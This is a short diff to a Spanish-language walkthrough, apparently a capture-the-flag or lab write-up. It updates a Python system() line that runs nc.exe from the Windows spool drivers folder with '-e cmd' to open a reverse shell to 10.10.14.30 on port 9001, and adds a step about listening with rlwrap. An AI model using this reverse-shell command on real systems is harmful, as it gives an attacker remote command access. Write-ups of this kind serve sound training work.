@@ -348,7 +348,10 @@ vemos las peticiones en nuestro servidor lo que nos indica que se acaba de desca
 ### conexión
 ahora usaremos un nuevo comando para ejecutar el nc.exe y establecer una conexión con nuestra maquina
 ```python
-system("C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -e cmd 10.10.14.30");
+system("C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -e cmd 10.10.14.30 9001");
 ```
 ![[Pasted image 20240520173557.png]]
 
+`rlwrap`
+estaremos a la escucha por el puerto 9001 enviamos
+![[Pasted image 20240520173809.png]]
